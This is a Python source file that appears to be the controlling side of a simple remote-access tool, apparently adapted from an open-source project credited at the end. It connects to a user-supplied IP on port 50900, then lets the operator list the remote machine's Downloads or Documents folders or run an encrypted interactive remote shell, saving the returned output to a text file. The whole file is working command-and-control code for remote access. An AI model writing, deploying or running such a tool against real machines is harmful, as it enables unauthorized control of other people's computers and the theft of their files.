import socket
from Crypto.Cipher import AES
import os

working_directory = os.getcwd()


def encrypt():
    # Generation de clé AES pour le chiffrement
    with open(working_directory + "\encrypt-iv.bin", "rb") as file:
        iv_aes = file.readline()
    with open(working_directory + "\encrypt-key.bin", "rb") as file:
        key_aes = file.readline()
    key = AES.new(key_aes, AES.MODE_CFB, iv_aes)
    return key


def decrypt():
    # Generation de clé AES pour le decryptage
    with open(working_directory + "\decrypt-iv.bin", "rb") as file:
        iv_aes2 = file.readline()
    with open(working_directory + "\decrypt-key.bin", "rb") as file:
        key_aes2 = file.readline()
    key2 = AES.new(key_aes2, AES.MODE_CFB, iv_aes2)
    return key2

class Client:
    def __init__(self, host=input('IP: '), port=50900):
        self.host = host
        self.port = port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def menu(self):
        choice = input('1 - Get Info\n2 - Remote Shell\n>> ')
        if choice == '1':
            self.get_info()
        elif choice == '2':
            self.send_commands()
        else:
            print('Choose 1 or 2')
            self.menu()

    def socket_connect(self):
        try:
            self.s.connect((self.host, self.port))
        except socket.error as msg:
            print("Socket connection error: " + str(msg))

    def send_commands(self):
        while True:
            cmd = input("\n%s>> " % self.host)
            while cmd == "":
                cmd = input("\n%s>> " % self.host)

            if cmd == 'save':
                self.save()
                self.send_commands()
            elif cmd == 'quit':
                cmd = cmd.encode('utf-8')
                cmd = encrypt().encrypt(cmd)
                self.s.send(cmd)
                self.s.close()
                exit()
            else:
                cmd = cmd.encode('utf-8')
                cmd = encrypt().encrypt(cmd)
                self.s.send(cmd)
                self.directory()

    def get_info(self):
        recuperate = input("which folder do you want to see ?\n1 - Downloads\n2 - Documents\n>> ")
        if recuperate == '1':
            cmd = "Downloads"
            cmd = cmd.encode('utf-8')
            cmd = encrypt().encrypt(cmd)
            self.s.send(cmd)
            self.directory()
            self.menu()

        if recuperate == '2':
            cmd = "Documents"
            cmd = cmd.encode('utf-8')
            cmd = encrypt().encrypt(cmd)
            self.s.send(cmd)
            self.directory()
            self.menu()

    def directory(self):
        client_response = self.s.recv(1024)
        client_response = decrypt().decrypt(client_response)
        self.client_response = client_response.decode('utf-8', 'ignore')
        print(str(self.client_response))

    def save(self):
        f = open("get_info.txt", "a")
        f.write(self.client_response)
        f.close()
        self.send_commands()


c = Client()
c.socket_connect()
c.menu()

# SOURCES
# https://github.com/buckyroberts/Turtle/blob/master/Single_Client/client.py
# https://stackoverflow.com/questions/31756166/python-3-socket-chat-encryption-with-pycrypto-gives-unicodedecodeerror
